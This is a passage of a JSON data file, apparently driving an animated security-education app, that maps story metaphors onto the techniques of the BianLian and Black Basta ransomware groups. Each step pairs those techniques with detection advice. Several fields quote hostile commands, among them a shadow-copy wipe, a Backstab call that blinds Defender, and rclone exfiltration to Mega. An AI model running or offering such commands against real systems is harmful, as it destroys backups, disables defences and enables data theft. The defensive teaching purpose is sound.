          "storyTerm": "Bespoke compact radio compiled per victim",
          "technicalTerm": "Uniquely compiled 64-bit Golang backdoor masquerading in C:\\Windows\\Temp or ProgramData",
          "tone": "amber"
        },
        {
          "storyTerm": "Refusing to speak except to one hardcoded wax-sealed tower",
          "technicalTerm": "Mutual TLS (mTLS) authentication with hardcoded X.509 client and server pinning",
          "tone": "sky"
        },
        {
          "storyTerm": "Distinct internal radio parts stamped inside",
          "technicalTerm": "Embedded Go package symbols main.backconnect, hashicorp/yamux, and armon/go-socks5",
          "tone": "rose"
        },
        {
          "storyTerm": "Sensor catching the unsigned newcomer",
          "technicalTerm": "Sysmon EventID 1 and EventID 3 flagging unsigned Go binaries making external TLS calls",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-bianlian-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Bespoke compact radio compiled per victim",
          "subtitle": "Uniquely compiled 64-bit Golang backdoor masquerading in…",
          "tone": "amber"
        },
        {
          "id": "ran-bianlian-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Refusing to speak except to one…",
          "subtitle": "Mutual TLS (mTLS) authentication with hardcoded X.509 client…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Crew One",
          "stageTag": "STEP 01 · SETUP",
          "title": "Bespoke compact radio compiled per victim",
          "storyExcerpt": "Right after crossing the perimeter, the crew drops a bespoke compact radio built specifically for this single victim that refuses to speak to anyone except one hardcoded wax-sealed command…",
          "technicalParallel": "Because the C2 IP and X.509 certificates are compiled directly into each binary right before deployment, every victim receives a distinct file hash.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. One Wax-sealed",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Refusing to speak except to one hardcoded wax-sealed…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses refusing to speak except to one hardcoded wax-sealed tower to advance toward distinct internal radio parts stamped inside.",
          "technicalParallel": "After initial entry, BianLian dropped a uniquely compiled 64-bit Golang executable (masquerading under Windows system filenames like SystemSettingsAdminFlows.exe or Win64Ark.exe) that initiated an…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Crew One",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Sensor catching the unsigned newcomer",
          "storyExcerpt": "Behind the scenes, sensor catching the unsigned newcomer captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Correlate Sysmon EventID 1 (Process Creation) and EventID 3 (Network Connection) to identify unsigned Golang executables in C:\\Windows\\Temp or C:\\ProgramData containing Go symbols main.backconnect…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Radio Line",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "File Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Tunnel Split",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1573.002"
    },
    "step-2": {
      "scenarioId": "bianlian-extortion-go-backdoor-rdp",
      "sectionKey": "step-2",
      "sceneKind": "ran-bianlian-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot",
      "storyCue": "Over that single quiet encrypted radio line, the backdoor splits open dozens of virtual internal hallway lanes at once, allowing remote operators to probe internal file rooms and directory cabinets as if sitting directly inside the corporate office.",
      "technicalCue": "T1090.001 · LATERAL & C2 — Once the mTLS socket connected, the Golang backdoor wrapped the TLS stream in a HashiCorp Yamux connection multiplexer (github.com/hashicorp/yamux) and attached an in-memory SOCKS5 server…",
      "storyMappings": [
        {
          "storyTerm": "Splitting one radio line into dozens of hallway lanes",
          "technicalTerm": "HashiCorp Yamux stream multiplexing layered inside the mTLS connection",
          "tone": "amber"
        },
        {
          "storyTerm": "Internal doorway relay into corporate rooms",
          "technicalTerm": "Embedded armon/go-socks5 proxy forwarding operator traffic into the internal LAN",
          "tone": "sky"
        },
        {
          "storyTerm": "Probing internal file rooms and directory cabinets",
          "technicalTerm": "Rapid internal SMB (TCP/445) and LDAP (TCP/389) fan-out from one compromised host",
          "tone": "rose"
        },
        {
          "storyTerm": "Zero extra proxy tools dropped on disk",
          "technicalTerm": "All-in-one memory-resident proxy evading standalone Chisel/ngrok detections",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-bianlian-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Splitting one radio line into dozens of…",
          "subtitle": "HashiCorp Yamux stream multiplexing layered inside the mTLS…",
          "tone": "amber"
        },
        {
          "id": "ran-bianlian-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Internal doorway relay into corporate…",
          "subtitle": "Embedded armon/go-socks5 proxy forwarding operator traffic…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. One Line",
          "stageTag": "STEP 02 · SETUP",
          "title": "Splitting one radio line into dozens of hallway lanes",
          "storyExcerpt": "Over that single quiet encrypted radio line, the backdoor splits open dozens of virtual internal hallway lanes at once, allowing remote operators to probe internal file rooms and directory…",
          "technicalParallel": "By centralizing C2 and proxying inside a single lightweight Go binary that contains zero exploit code or encryption routines, BianLian minimizes its endpoint footprint across the domain.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses File",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Internal doorway relay into corporate rooms",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses internal doorway relay into corporate rooms to advance toward probing internal file rooms and directory cabinets.",
          "technicalParallel": "Once the mTLS socket connected, the Golang backdoor wrapped the TLS stream in a HashiCorp Yamux connection multiplexer (github.com/hashicorp/yamux) and attached an in-memory SOCKS5 server…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. File",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Zero extra proxy tools dropped on disk",
          "storyExcerpt": "Behind the scenes, zero extra proxy tools dropped on disk captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Monitor NDR and EDR network telemetry (which correlates internal east-west bursts with external sessions) for a single non-Domain-Controller host initiating rapid fan-out SMB (port 445) and LDAP (port…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Radio Line",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "File Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Tunnel Split",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1090.001"
    },
    "step-3": {
      "scenarioId": "bianlian-extortion-go-backdoor-rdp",
      "sectionKey": "step-3",
      "sceneKind": "ran-bianlian-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)",
      "storyCue": "Leaving every filing cabinet unlocked so anti-lockdown alarms stay completely silent, the crew renames a standard cloud-sync moving van to blend into Windows utilities, hauls out gigabytes of corporate records, and leaves behind an extortion threat demanding payment to prevent public leaks.",
      "technicalCue": "T1567.002 · EXFIL & IMPACT — Skipping file encryption completely (thereby evading all EDR behavioral ransomware sensors that watch for mass file-rename or high-entropy overwrite loops), BianLian staged a renamed copy of…",
      "storyMappings": [
        {
          "storyTerm": "Leaving every cabinet unlocked to keep lockdown alarms silent",
          "technicalTerm": "Zero file encryption bypassing behavioral ransomware rollback and entropy detectors",
          "tone": "amber"
        },
        {
          "storyTerm": "Renamed cloud-sync moving van",
          "technicalTerm": "rclone.exe renamed to Win.exe syncing staged shares to Mega.io or FTP servers",
          "tone": "sky"
        },
        {
          "storyTerm": "Inventorying valuable corporate rooms first",
          "technicalTerm": "SharpShares mapping readable finance, legal, and HR SMB network shares",
          "tone": "rose"
        },
        {
          "storyTerm": "Extortion threat without encryption",
          "technicalTerm": "Pure data-theft ransom demand backed by threat of public leak-site publication",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-bianlian-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Leaving every cabinet unlocked to keep…",
          "subtitle": "Zero file encryption bypassing behavioral ransomware rollback…",
          "tone": "amber"
        },
        {
          "id": "ran-bianlian-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Renamed cloud-sync moving van",
          "subtitle": "rclone.exe renamed to Win.exe syncing staged shares to Mega.io…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Keep",
          "stageTag": "STEP 03 · SETUP",
          "title": "Leaving every cabinet unlocked to keep lockdown…",
          "storyExcerpt": "Leaving every filing cabinet unlocked so anti-lockdown alarms stay completely silent, the crew renames a standard cloud-sync moving van to blend into Windows utilities, hauls out gigabytes of…",
          "technicalParallel": "Even when rclone.exe is renamed to Win.exe or svchost.exe, its PE version-info header (OriginalFileName: rclone.exe) and Go symbol table remain intact and detectable by YARA/Sysmon.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Van",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Renamed cloud-sync moving van",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses renamed cloud-sync moving van to advance toward inventorying valuable corporate rooms first.",
          "technicalParallel": "Skipping file encryption completely (thereby evading all EDR behavioral ransomware sensors that watch for mass file-rename or high-entropy overwrite loops), BianLian staged a renamed copy of rclone.exe…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. So Anti-lockdown",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Extortion threat without encryption",
          "storyExcerpt": "Behind the scenes, extortion threat without encryption captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Sysmon EventID 1 matching OriginalFileName=rclone.exe or command-line flags (copy, --bwlimit, mega:) and egress firewall blocks on *.mega.co.nz.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Radio Line",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "File Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Tunnel Split",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1567.002"
    }
  },
  "blackbasta-qakbot-backstab-ransomware": {
    "briefing": {
      "scenarioId": "blackbasta-qakbot-backstab-ransomware",
      "sectionKey": "briefing",
      "sceneKind": "ran-blackbasta-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1566.004",
      "title": "Black Basta Teams Vishing, Quick Assist, Backstab EDR Bypass & ChaCha20… — Story-to-Technical Overview",
      "storyCue": "Imagine a burglar who jams a victim mailbox with thousands of junk flyers and then calls right away dressed as a helpful postal technician offering to fix the jam over a built-in home intercom. Once invited onto the desk, the fake technician flashes an outdated inspector badge to unplug the security alarm wires, wheels boxes of family records out the back door, shreds the spare backup notebooks, and snaps heavy padlocks onto every filing cabinet.",
      "technicalCue": "INITIAL ACCESS: Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse -> DEFENSE EVASION: Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging -> EXFIL & IMPACT: vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)",
      "storyMappings": [
        {
          "storyTerm": "Jamming the mailbox and calling as a helpful technician",
          "technicalTerm": "Email bombing followed by external Microsoft Teams vishing and QuickAssist.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Outdated inspector badge unplugging security alarm wires",
          "technicalTerm": "Backstab BYOVD tool abusing signed PROCEXP.SYS to strip EDR handles",
          "tone": "sky"
        },
        {
          "storyTerm": "Wheeling boxes of records out the back door",
          "technicalTerm": "SoftPerfect network discovery and Rclone cloud data exfiltration",
          "tone": "rose"
        },
        {
          "storyTerm": "Shredding backup notebooks and padlocking every cabinet",
          "technicalTerm": "vssadmin delete shadows /all /quiet followed by ChaCha20/RSA-4096 (.basta) encryption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-blackbasta-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Jamming the mailbox and calling as a…",
          "subtitle": "Email bombing followed by external Microsoft Teams vishing and…",
          "tone": "amber"
        },
        {
          "id": "ran-blackbasta-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Outdated inspector badge unplugging…",
          "subtitle": "Backstab BYOVD tool abusing signed PROCEXP.SYS to strip EDR…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Junk",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse",
          "storyExcerpt": "First, the intruder floods an employee office inbox with thousands of noisy junk circulars so the desk looks overwhelmed, then immediately rings the employee on an external office intercom posing as IT…",
          "technicalParallel": "Because QuickAssist.exe is natively included in Windows 10/11 and communicates exclusively with legitimate *.microsoft.com relay servers over HTTPS, standard perimeter firewalls and web proxies allow the…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Down",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging",
          "storyExcerpt": "Taking control of the mouse straight through the remote-help window, the fake technician pulls down a toolbox, flashes an older officially signed maintenance badge to sever the office alarm monitors…",
          "technicalParallel": "Closing all kernel handles held by an EDR process via Backstab renders the security sensor deaf and unable to inspect files or processes even if the main user-mode .exe appears running in Task Manager.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Down",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)",
          "storyExcerpt": "Spreading rapidly down every connected corridor, the intruder runs a shredder through every backup recovery ledger on every server and snaps strong double-keyed locks across every shared cabinet, leaving…",
          "technicalParallel": "By encrypting 64 bytes and skipping 128 bytes across large files, Black Basta corrupts multi-terabyte file servers in minutes before administrators can pull network cables.",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tech Phone",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Fleet",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Padlock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "blackbasta-qakbot-backstab-ransomware",
      "sectionKey": "step-1",
      "sceneKind": "ran-blackbasta-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse",
      "storyCue": "First, the intruder floods an employee office inbox with thousands of noisy junk circulars so the desk looks overwhelmed, then immediately rings the employee on an external office intercom posing as IT support and talks them into typing a six-digit remote-control code.",
      "technicalCue": "T1566.004 · INITIAL ACCESS — Storm-1811 bombarded the target’s corporate email address with thousands of automated newsletter registrations (creating both distraction and a believable pretext for an urgent IT call, while…",
      "storyMappings": [
        {
          "storyTerm": "Thousands of noisy junk circulars flooding the inbox",
          "technicalTerm": "Automated SMTP email bombing via mass newsletter subscription forms",
          "tone": "amber"
        },
        {
          "storyTerm": "External office intercom posing as IT support",
          "technicalTerm": "External tenant Microsoft Teams chat and voice phishing by Storm-1811",
          "tone": "sky"
        },
        {
          "storyTerm": "Built-in remote-control code",
          "technicalTerm": "Windows QuickAssist.exe interactive remote screen-control session",
          "tone": "rose"
        },
        {
          "storyTerm": "Bypassing email attachment scanners",
          "technicalTerm": "Human-authorized screen takeover requiring zero malicious email attachments",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-blackbasta-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Thousands of noisy junk circulars…",
          "subtitle": "Automated SMTP email bombing via mass newsletter subscription…",
          "tone": "amber"
        },
        {
          "id": "ran-blackbasta-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "External office intercom posing as IT…",
          "subtitle": "External tenant Microsoft Teams chat and voice phishing by…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Junk",
          "stageTag": "STEP 01 · SETUP",
          "title": "Thousands of noisy junk circulars flooding the inbox",
          "storyExcerpt": "First, the intruder floods an employee office inbox with thousands of noisy junk circulars so the desk looks overwhelmed, then immediately rings the employee on an external office intercom…",
          "technicalParallel": "Because QuickAssist.exe is natively included in Windows 10/11 and communicates exclusively with legitimate *.microsoft.com relay servers over HTTPS, standard perimeter firewalls and web proxies allow the…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses It",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "External office intercom posing as IT support",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses external office intercom posing as it support to advance toward built-in remote-control code.",
          "technicalParallel": "Storm-1811 bombarded the target’s corporate email address with thousands of automated newsletter registrations (creating both distraction and a believable pretext for an urgent IT call, while burying…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Code",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Bypassing email attachment scanners",
          "storyExcerpt": "Behind the scenes, bypassing email attachment scanners captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Correlate sudden inbound SMTP spam bursts (thousands of subscription confirmations in minutes) with external tenant Microsoft Teams calls and Sysmon EventID 1 (Process Creation) execution of…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tech Phone",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Fleet",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Padlock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1566.004"
    },
    "step-2": {
      "scenarioId": "blackbasta-qakbot-backstab-ransomware",
      "sectionKey": "step-2",
      "sceneKind": "ran-blackbasta-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging",
      "storyCue": "Taking control of the mouse straight through the remote-help window, the fake technician pulls down a toolbox, flashes an older officially signed maintenance badge to sever the office alarm monitors, scans every hallway for open file rooms, and ships confidential folders out through a hidden courier tunnel.",
      "technicalCue": "T1562.001 · DEFENSE EVASION — Inside the QuickAssist.exe session, the operator used curl.exe or msiexec.exe to stage payloads, executed Backstab (backstab.exe -n MsMpEng.exe -k, an open-source BYOVD utility that loads the…",
      "storyMappings": [
        {
          "storyTerm": "Pulling down a toolbox through the remote-help window",
          "technicalTerm": "QuickAssist.exe spawning curl.exe or msiexec.exe to stage payloads",
          "tone": "amber"
        },
        {
          "storyTerm": "Older signed maintenance badge severing alarm monitors",
          "technicalTerm": "backstab.exe loading signed PROCEXP.SYS to close EDR protected process handles",
          "tone": "sky"
        },
        {
          "storyTerm": "Scanning hallways for open file rooms",
          "technicalTerm": "SoftPerfect Network Scanner enumerating internal servers and SMB shares",
          "tone": "rose"
        },
        {
          "storyTerm": "Shipping confidential folders through a courier tunnel",
          "technicalTerm": "Rclone exfiltrating staged archives to attacker cloud storage",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-blackbasta-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Pulling down a toolbox through the…",
          "subtitle": "QuickAssist.exe spawning curl.exe or msiexec.exe to stage…",
          "tone": "amber"
        },
        {
          "id": "ran-blackbasta-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Older signed maintenance badge severing…",
          "subtitle": "backstab.exe loading signed PROCEXP.SYS to close EDR protected…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Down",
          "stageTag": "STEP 02 · SETUP",
          "title": "Pulling down a toolbox through the remote-help window",
          "storyExcerpt": "Taking control of the mouse straight through the remote-help window, the fake technician pulls down a toolbox, flashes an older officially signed maintenance badge to sever the office alarm…",
          "technicalParallel": "Closing all kernel handles held by an EDR process via Backstab renders the security sensor deaf and unable to inspect files or processes even if the main user-mode .exe appears running in Task Manager.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Open",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Older signed maintenance badge severing alarm monitors",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses older signed maintenance badge severing alarm monitors to advance toward scanning hallways for open file rooms.",
          "technicalParallel": "Inside the QuickAssist.exe session, the operator used curl.exe or msiexec.exe to stage payloads, executed Backstab (backstab.exe -n MsMpEng.exe -k, an open-source BYOVD utility that loads the signed…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Open File",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Shipping confidential folders through a courier tunnel",
          "storyExcerpt": "Behind the scenes, shipping confidential folders through a courier tunnel captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Alert on Sysmon EventID 1 (Process Creation capturing parent-child trees) and EventID 6 (DriverLoaded logging kernel driver images) when QuickAssist.exe spawns cmd.exe, powershell.exe, or msiexec.exe and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tech Phone",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Fleet",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Padlock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.001"
    },
    "step-3": {
      "scenarioId": "blackbasta-qakbot-backstab-ransomware",
      "sectionKey": "step-3",
      "sceneKind": "ran-blackbasta-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)",
      "storyCue": "Spreading rapidly down every connected corridor, the intruder runs a shredder through every backup recovery ledger on every server and snaps strong double-keyed locks across every shared cabinet, leaving a printed ransom letter on every desk.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Pivoting across the domain with PsExec or WMI, the operator ran vssadmin.exe delete shadows /all /quiet to destroy Volume Shadow Copies and executed the C++ Black Basta encryptor (basta.exe…",
      "storyMappings": [
        {
          "storyTerm": "Spreading down every connected corridor",
          "technicalTerm": "Domain-wide lateral propagation using PsExec or WMI across enterprise hosts",
          "tone": "amber"
        },
        {
          "storyTerm": "Shredding every backup recovery ledger",
          "technicalTerm": "vssadmin.exe delete shadows /all /quiet wiping Volume Shadow Copies",
          "tone": "sky"
        },
        {
          "storyTerm": "Double-keyed locks across every cabinet",
          "technicalTerm": "Black Basta ChaCha20 stream encryption wrapped by RSA-4096 appending .basta",
          "tone": "rose"
        },
        {
          "storyTerm": "Printed ransom letter on every desk",
          "technicalTerm": "Dropped readme.faa.txt extortion note demanding payment for decryption",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-blackbasta-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Spreading down every connected corridor",
          "subtitle": "Domain-wide lateral propagation using PsExec or WMI across…",
          "tone": "amber"
        },
        {
          "id": "ran-blackbasta-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Shredding every backup recovery ledger",
          "subtitle": "vssadmin.exe delete shadows /all /quiet wiping Volume Shadow…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Down",
          "stageTag": "STEP 03 · SETUP",
          "title": "Spreading down every connected corridor",
          "storyExcerpt": "Spreading rapidly down every connected corridor, the intruder runs a shredder through every backup recovery ledger on every server and snaps strong double-keyed locks across every shared…",
          "technicalParallel": "By encrypting 64 bytes and skipping 128 bytes across large files, Black Basta corrupts multi-terabyte file servers in minutes before administrators can pull network cables.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Shredding every backup recovery ledger",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses shredding every backup recovery ledger to advance toward double-keyed locks across every cabinet.",
          "technicalParallel": "Pivoting across the domain with PsExec or WMI, the operator ran vssadmin.exe delete shadows /all /quiet to destroy Volume Shadow Copies and executed the C++ Black Basta encryptor (basta.exe -forcepath…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Desk",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Printed ransom letter on every desk",
          "storyExcerpt": "Behind the scenes, printed ransom letter on every desk captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Configure EDR behavioral prevention to block vssadmin.exe delete shadows /all /quiet (which destroys native Windows recovery snapshots) and trigger immediate containment on rapid .basta file renames…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tech Phone",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Fleet",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Padlock Wave",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "cactus-ransomware-qlik-sense-ssh-batch-unpacker": {
    "briefing": {
      "scenarioId": "cactus-ransomware-qlik-sense-ssh-batch-unpacker",
      "sectionKey": "briefing",
      "sceneKind": "ran-cactus-briefing",
